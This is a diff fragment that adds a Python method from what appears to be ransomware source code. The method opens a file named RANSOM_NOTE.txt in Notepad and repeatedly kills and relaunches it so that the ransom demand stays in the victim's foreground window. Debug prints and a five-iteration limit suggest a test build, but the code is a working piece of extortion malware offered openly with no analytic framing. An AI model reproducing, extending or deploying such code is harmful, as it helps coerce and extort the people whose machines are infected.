@@ -1,0 +1,23 @@
+def show_ransom_note(self):
+        # Open the ransom note
+        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
+        count = 0 # Debugging/Testing
+        while True:
+            time.sleep(0.1)
+            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+            if top_window == 'RANSOM_NOTE - Notepad':
+                print('Ransom note is the top window - do nothing') # Debugging/Testing
+                pass
+            else:
+                print('Ransom note is not the top window - kill/create process again') # Debugging/Testing
+                # Kill ransom note so we can open it agian and make sure ransom note is in ForeGround (top of all windows)
+                time.sleep(0.1)
+                ransom.kill()
+                # Open the ransom note
+                time.sleep(0.1)
+                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
+            # sleep for 10 seconds
+            time.sleep(10)
+            count +=1 
+            if count == 5:
+                break
